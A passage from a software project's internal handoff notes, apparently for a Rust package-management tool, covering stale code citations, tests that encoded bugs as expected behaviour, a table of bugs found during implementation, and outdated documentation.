`:384`.** The *reasoning* is still correct. **The correction needed a correction inside one
session** — which is the argument, not a footnote to it. Treat a citation as a place to start
looking, never as proof — **grep the symbol, don't trust the line.** Every cycle-detection
citation on Phase 2's checklist has rotted the same way (`planner.rs:323` → `:276`,
`profiles.rs:62` → `:88`, `modules.rs:146` → `:165`); the claim they support — *"already caught
in all three places, do not rewrite"* — **re-verified true.**

**Four tests have now encoded a bug as an expectation** — asserting the broken behaviour so
review saw a green suite and moved on: `enforce_refuses_without_opt_in_and_proceeds_with_it`
(the guard letting `--allow-mass-removal` delete python3, S16), the `prune`/`protect_imperative`
gate tests (sync configured not to converge), and `protected_packages_are_never_adopted` (E7).
**A test named for the behaviour is not evidence the behaviour is right** — it is evidence
someone wrote the code and the test together, believing the same wrong thing. When a test's
name asserts a Part II rule, check it against Part II before trusting it.

**Verify any Part II–VI citation against `HEAD` before you act on it.** Part V's *reasoning*
has been consistently right and is worth following; its *measurements* are not.

## Bugs found while implementing

**S1–S11 in VI.2 → "Found during implementation".** Each is assigned to the phase that owns
the mechanism. Four were live defects already fixed (S1 shim deletion, S10 tests writing to
the real data dir, and two parser bugs); the rest are scheduled. Add to that table rather
than to a commit message — a bug recorded only in a commit message is a bug nobody will find.

## Not started, and owed

`README.md` (28k) still documents `-g`, `prune`, `clone` and `migrate` — **all four deleted in
Phase 0.** `CHANGELOG.md` likewise. Both are Phase 5 (docs), and both are cleanly separable
from the code work if a second session ever runs in parallel.
